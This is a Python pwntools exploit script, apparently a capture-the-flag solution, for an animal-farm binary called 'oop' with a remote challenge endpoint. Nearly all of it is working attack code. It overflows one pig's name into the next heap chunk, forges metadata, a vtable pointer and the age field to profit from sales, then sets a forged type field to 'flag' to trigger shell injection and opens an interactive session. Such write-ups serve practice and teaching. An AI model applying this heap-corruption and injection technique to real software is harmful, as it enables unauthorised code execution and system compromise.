#!/usr/bin/env python3

from pwn import *

the_binary = "./oop"
context.binary = the_binary
elf = context.binary

context.terminal = ["tmux", "splitw", "-v"]

if args.REMOTE:
    io = remote("193.57.159.27", 62750)
elif args.STRACE:
    io = process(["strace", "-o" ,"trace.txt", the_binary])
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, f"""
        file {the_binary}
        continue
    """)

class Const:
    opt_list = 1
    opt_act = 2
    opt_buy_animal = 3
    opt_buy_translator = 4

    pig_max_age = 18
    cow_max_age = 20

def index(idx):
    io.sendlineafter("> ", str(idx))
menu = index

def act_index(idx):
    io.sendlineafter("animal? ", str(idx))

def list_animals():
    menu(Const.opt_list)

def _set_name(name):
    assert len(name) <= 0x40
    io.sendlineafter("animal? ", name)

def buy_pig(name):
    menu(Const.opt_buy_animal)
    menu(1)
    _set_name(name)

def buy_cow(name):
    menu(Const.opt_buy_animal)
    menu(2)
    _set_name(name)

def sell_animal(idx):
    menu(Const.opt_act)
    act_index(idx)
    menu(1)

def rename_animal(idx, name):
    menu(Const.opt_act)
    act_index(idx)
    menu(3)
    _set_name(name)

def buy_translator():
    menu(Const.opt_buy_translator)

def translate(idx):
    menu(Const.opt_act)
    act_index(idx)
    index(4)

def fake_pig_overflow(age=0, hunger=0, type_=b"pig"):
    data = b""
    data += b"A"*0x10
    data += p32(0)
    data += p64(0)
    data += p64(0x41)
    data += p64(0x404d78)  # Animal vtable
    data += type_.ljust(0x10, b"\x00")
    data += p8(0)
    data += p8(Const.pig_max_age)
    data += p8(hunger)
    data += p8(age)

    assert not any(x == 0xa for x in data)
    return data

# Overflow from pig A into the metadata of pig B, overwriting the age field
# pig B to max_age / 2, so we can sell it for a nice profit.
for i in range(3):
    buy_pig("A"*0x10)
    buy_pig("B"*0x10)
    fake_pig = fake_pig_overflow(age=Const.pig_max_age // 2 - 1)
    rename_animal(0, fake_pig)
    sell_animal(1)
    sell_animal(0)

# We now have enough to buy the translator, which allows us to exploit a shell
# injection vulnerability controllable by a forged type field in an Animal.
buy_translator()

# Corrupt an Animal's type field.
buy_pig("A"*0x10)
buy_pig("B"*0x10)
fake_pig = fake_pig_overflow(type_=b"flag")
rename_animal(0, fake_pig)

# Trigger shell injection.
translate(1)

io.interactive()
